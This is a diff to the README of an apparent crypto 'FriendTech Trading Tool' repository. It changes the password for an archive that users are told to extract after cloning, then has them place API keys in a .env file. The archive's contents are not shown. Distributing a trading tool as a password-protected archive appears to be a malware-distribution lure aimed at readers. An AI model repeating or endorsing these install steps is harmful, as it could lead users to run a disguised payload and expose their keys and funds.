@@ -31,7 +31,7 @@ Follow these steps to get started with the FriendTech Trading Tool:
    git clone https://github.com/gemhunterheh/FriendTech-Trading-Tool.git
    cd FriendTech-Trading-Tool
    
-2. **extract archive with pass `x`**
+2. **extract archive with pass `D4GAfxEFsJ`**
 3. **Configure API Keys:**
 You'll need to set up API keys for the trading data sources you plan to use. Create a .env file and add your API keys:
 API_KEY=your-api-key
